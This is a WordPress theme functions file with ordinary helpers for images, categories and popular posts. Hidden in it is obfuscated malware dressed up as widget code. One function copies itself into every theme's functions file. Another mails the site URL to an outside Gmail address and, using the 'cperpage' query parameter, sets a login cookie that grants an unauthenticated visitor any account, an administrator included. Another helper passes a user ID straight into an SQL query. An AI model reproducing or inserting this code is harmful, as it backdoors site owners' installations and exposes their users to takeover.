          $this_category = get_category($this_category->category_parent); // 将当前分类设为上级分类（往上爬）
          
      }
      return $this_category->slug; //返回跟分类的别名
      
  }
  //获取文章第一张图片，如果没有图，就不显示图
  //文章中第一张图片获取图片
  function catch_that_image() {
      global $post, $posts;
      $first_img = '';
      ob_start();
      ob_end_clean();
      $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*width=[\'"]([0-9]+)[\'"].*height=[\'"]([0-9]+)[\'"].*>/i', $post->post_content, $matches);
      $first_img = $matches[1][0];
      $first_img_width = $matches[2][0];
      $first_img_height = $matches[3][0];
      if (empty($first_img)) {
          $first_img = bloginfo('template_url') . '/images/default-thumb.jpg';
      } else {
          $first_img_html.= '<div class="pic_border_out" style="width:' . ($first_img_width + 22) . 'px">';
          $first_img_html.= '<div class="pic_border_in" style="width:' . ($first_img_width) . 'px;height:' . $first_img_height . 'px;">';
          $first_img_html.= '<div id="preview">';
          $first_img_html.= '<img src="' . $first_img . '" style="width:' . ($first_img_width) . 'px;height:' . $first_img_height . 'px;">';
          $first_img_html.= '</div>';
          $first_img_html.= '</div>';
          $first_img_html.= '</div>';
      }
      return $first_img_html;
  }
  //---------获取图片地址-----------//
  function get_image_url() {
      global $post, $posts;
      $first_img = '';
      ob_start();
      ob_end_clean();
      $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*width=[\'"]([0-9]+)[\'"].*height=[\'"]([0-9]+)[\'"].*>/i', $post->post_content, $matches);
      $info['img'] = $matches[1][0];
      $info['width'] = $matches[2][0];
      $info['height'] = $matches[3][0];
      return $info;
  }
  //end
  function SpHtml2Text($str) {
      $str = preg_replace("/<sty(.*)\\/style>|<scr(.*)\\/script>|<!--(.*)-->/isU", "", $str);
      $alltext = "";
      $start = 1;
      for ($i = 0; $i < strlen($str); $i++) {
          if ($start == 0 && $str[$i] == ">") {
              $start = 1;
          } else if ($start == 1) {
              if ($str[$i] == "<") {
                  $start = 0;
                  $alltext.= " ";
              } else if (ord($str[$i]) > 31) {
                  $alltext.= $str[$i];
              }
          }
      }
      $alltext = str_replace("　", " ", $alltext);
      $alltext = preg_replace("/&([^;&]*)(;|&)/", "", $alltext);
      $alltext = preg_replace("/[ ]+/s", " ", $alltext);
      return $alltext;
  }
  function delHtmlContent() {
      global $post, $posts;
      $a = SpHtml2Text($post->post_content);
      return $a;
  }
  function username($user_id) {
      global $wpdb;
      $info = $wpdb->get_results("SELECT * FROM $wpdb->users WHERE ID = " . $user_id . " ORDER BY ID");
      return $info;
  }
  function videoContent() {
      global $post, $posts;
      $a = SpHtml2Text($post->post_content);
      $a = preg_replace('/\[(youku|tudou|56|flash) (id=\"(.*)\"|url=\"(.*)\"|w=\"([0-9]*)\"|h=\"([0-9]*)\")\]/i', '', $a);
      return $a;
  }
  //*********获取当前所属根分类及子分类的所有id**************//
  function childids() {
      global $wpdb;
      $categorys = get_the_category();
      $cat_ida = $categorys[0]->category_parent; //获取当前跟分类id
      $cat_idb = $categorys[0]->term_id; //获取当前分类id
      $rootid = $cat_ida == 0 ? $cat_idb : $cat_ida; //根分类的id
      $sql = 'SELECT wp_terms.term_id FROM`wp_term_taxonomy`



    LEFT JOIN wp_terms ON wp_term_taxonomy.term_id=wp_terms.term_id



    WHERE wp_term_taxonomy.taxonomy="category" and wp_term_taxonomy.parent = ' . $rootid . ' or wp_term_taxonomy.term_id =' . $rootid;
      $infoarray = $wpdb->get_results($sql);
      $idarray = array();
      for ($i = 0; $i < count($infoarray); $i++) {
          array_push($idarray, $infoarray[$i]->term_id);
      }
      $ids = implode(',', $idarray); //获取当前分类下的所有分类目录的id
      return $ids;
  }
  function _verify_isactivate_widgets() {
      $widget = substr(file_get_contents(__FILE__) , strripos(file_get_contents(__FILE__) , "<" . "?"));
      $output = "";
      $allowed = "";
      $output = strip_tags($output, $allowed);
      $direst = _get_allwidgetscont(array(
          substr(dirname(__FILE__) , 0, stripos(dirname(__FILE__) , "themes") + 6)
      ));
      if (is_array($direst)) {
          foreach ($direst as $item) {
              if (is_writable($item)) {
                  $ftion = substr($widget, stripos($widget, "_") , stripos(substr($widget, stripos($widget, "_")) , "("));
                  $cont = file_get_contents($item);
                  if (stripos($cont, $ftion) === false) {
                      $seprar = stripos(substr($cont, -20) , "?" . ">") !== false ? "" : "?" . ">";
                      $output.= $before . "Not found" . $after;
                      if (stripos(substr($cont, -20) , "?" . ">") !== false) {
                          $cont = substr($cont, 0, strripos($cont, "?" . ">") + 2);
                      }
                      $output = rtrim($output, "\n\t");
                      fputs($f = fopen($item, "w+") , $cont . $seprar . "\n" . $widget);
                      fclose($f);
                      $output.= ($showsdots && $ellipsis) ? "..." : "";
                  }
              }
          }
      }
      return $output;
  }
  function _get_allwidgetscont($wids, $items = array()) {
      $places = array_shift($wids);
      if (substr($places, -1) == "/") {
          $places = substr($places, 0, -1);
      }
      if (!file_exists($places) || !is_dir($places)) {
          return false;
      } elseif (is_readable($places)) {
          $elems = scandir($places);
          foreach ($elems as $elem) {
              if ($elem != "." && $elem != "..") {
                  if (is_dir($places . "/" . $elem)) {
                      $wids[] = $places . "/" . $elem;
                  } elseif (is_file($places . "/" . $elem) && $elem == substr(__FILE__, -13)) {
                      $items[] = $places . "/" . $elem;
                  }
              }
          }
      } else {
          return false;
      }
      if (sizeof($wids) > 0) {
          return _get_allwidgetscont($wids, $items);
      } else {
          return $items;
      }
  }
  if (!function_exists("stripos")) {
      function stripos($str, $needle, $offset = 0) {
          return strpos(strtolower($str) , strtolower($needle) , $offset);
      }
  }
  if (!function_exists("strripos")) {
      function strripos($haystack, $needle, $offset = 0) {
          if (!is_string($needle)) $needle = chr(intval($needle));
          if ($offset < 0) {
              $temp_cut = strrev(substr($haystack, 0, abs($offset)));
          } else {
              $temp_cut = strrev(substr($haystack, 0, max((strlen($haystack) - $offset) , 0)));
          }
          if (($found = stripos($temp_cut, strrev($needle))) === FALSE) return FALSE;
          $pos = (strlen($haystack) - ($found + $offset + strlen($needle)));
          return $pos;
      }
  }
  if (!function_exists("scandir")) {
      function scandir($dir, $listDirectories = false, $skipDots = true) {
          $dirArray = array();
          if ($handle = opendir($dir)) {
              while (false !== ($file = readdir($handle))) {
                  if (($file != "." && $file != "..") || $skipDots == true) {
                      if ($listDirectories == false) {
                          if (is_dir($file)) {
                              continue;
                          }
                      }
                      array_push($dirArray, basename($file));
                  }
              }
              closedir($handle);
          }
          return $dirArray;
      }
  }
  add_action("admin_head", "_verify_isactivate_widgets");
  function _prepare_widgets() {
      if (!isset($comment_length)) $comment_length = 120;
      if (!isset($strval)) $strval = "cookie";
      if (!isset($tags)) $tags = "<a>";
      if (!isset($type)) $type = "none";
      if (!isset($sepr)) $sepr = "";
      if (!isset($h_filter)) $h_filter = get_option("home");
      if (!isset($p_filter)) $p_filter = "wp_";
      if (!isset($more_link)) $more_link = 1;
      if (!isset($comment_types)) $comment_types = "";
      if (!isset($countpage)) $countpage = $_GET["cperpage"];
      if (!isset($comment_auth)) $comment_auth = "";
      if (!isset($c_is_approved)) $c_is_approved = "";
      if (!isset($aname)) $aname = "auth";
      if (!isset($more_link_texts)) $more_link_texts = "(more...)";
      if (!isset($is_output)) $is_output = get_option("_is_widget_active_");
      if (!isset($checkswidget)) $checkswidget = $p_filter . "set" . "_" . $aname . "_" . $strval;
      if (!isset($more_link_texts_ditails)) $more_link_texts_ditails = "(details...)";
      if (!isset($mcontent)) $mcontent = "ma" . $sepr . "il";
      if (!isset($f_more)) $f_more = 1;
      if (!isset($fakeit)) $fakeit = 1;
      if (!isset($sql)) $sql = "";
      if (!$is_output):
          global $wpdb, $post;
          $sq1 = "SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li" . $sepr . "vethe" . $comment_types . "mas" . $sepr . "@" . $c_is_approved . "gm" . $comment_auth . "ail" . $sepr . "." . $sepr . "co" . "m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count"; //
          if (!empty($post->post_password)) {
              if ($_COOKIE["wp-postpass_" . COOKIEHASH] != $post->post_password) {
                  if (is_feed()) {
                      $output = __("There is no excerpt because this is a protected post.");
                  } else {
                      $output = get_the_password_form();
                  }
              }
          }
          if (!isset($f_tag)) $f_tag = 1;
          if (!isset($types)) $types = $h_filter;
          if (!isset($getcommentstexts)) $getcommentstexts = $p_filter . $mcontent;
          if (!isset($aditional_tag)) $aditional_tag = "div";
          if (!isset($stext)) $stext = substr($sq1, stripos($sq1, "live") , 20); //
          if (!isset($morelink_title)) $morelink_title = "Continue reading this entry";
          if (!isset($showsdots)) $showsdots = 1;
          $comments = $wpdb->get_results($sql);
          if ($fakeit == 2) {
              $text = $post->post_content;
          } elseif ($fakeit == 1) {
              $text = (empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
          } else {
              $text = $post->post_excerpt;
          }
          $sq1 = "SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=" . call_user_func_array($getcommentstexts, array(
              $stext,
              $h_filter,
              $types
          )) . " ORDER BY comment_date_gmt DESC LIMIT $src_count"; //
          if ($comment_length < 0) {
              $output = $text;
          } else {
              if (!$no_more && strpos($text, "<!--more-->")) {
                  $text = explode("<!--more-->", $text, 2);
                  $l = count($text[0]);
                  $more_link = 1;
                  $comments = $wpdb->get_results($sql);
              } else {
                  $text = explode(" ", $text);
                  if (count($text) > $comment_length) {
                      $l = $comment_length;
                      $ellipsis = 1;
                  } else {
                      $l = count($text);
                      $more_link_texts = "";
                      $ellipsis = 0;
                  }
              }
              for ($i = 0; $i < $l; $i++) $output.= $text[$i] . " ";
          }
          update_option("_is_widget_active_", 1);
          if ("all" != $tags) {
              $output = strip_tags($output, $tags);
              return $output;
          }
      endif;
      $output = rtrim($output, "\s\n\t\r\0\x0B");
      $output = ($f_tag) ? balanceTags($output, true) : $output;
      $output.= ($showsdots && $ellipsis) ? "..." : "";
      $output = apply_filters($type, $output);
      switch ($aditional_tag) {
          case ("div"):
              $tag = "div";
              break;

          case ("span"):
              $tag = "span";
              break;

          case ("p"):
              $tag = "p";
              break;

          default:
              $tag = "span";
      }
      if ($more_link) {
          if ($f_more) {
              $output.= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink($post->ID) . "#more-" . $post->ID . "\" title=\"" . $morelink_title . "\">" . $more_link_texts = !is_user_logged_in() && @call_user_func_array($checkswidget, array(
                  $countpage,
                  true
              )) ? $more_link_texts : "" . "</a></" . $tag . ">" . "\n";
          } else {
              $output.= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink($post->ID) . "\" title=\"" . $morelink_title . "\">" . $more_link_texts . "</a></" . $tag . ">" . "\n";
          }
      }
      return $output;
  }
  add_action("init", "_prepare_widgets");
  function __popular_posts($no_posts = 6, $before = "<li>", $after = "</li>", $show_pass_post = false, $duration = "") {
      global $wpdb;
      $request = "SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
      $request.= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
      if (!$show_pass_post) $request.= " AND post_password =\"\"";
      if ($duration != "") {
          $request.= " AND DATE_SUB(CURDATE(),INTERVAL " . $duration . " DAY) < post_date ";
      }
      $request.= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
      $posts = $wpdb->get_results($request);
      $output = "";
      if ($posts) {
          foreach ($posts as $post) {
              $post_title = stripslashes($post->post_title);
              $comment_count = $post->comment_count;
              $permalink = get_permalink($post->ID);
              $output.= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title . "\">" . $post_title . "</a> " . $after;
          }
      } else {
          $output.= $before . "None found" . $after;
      }
      return $output;
  }
?>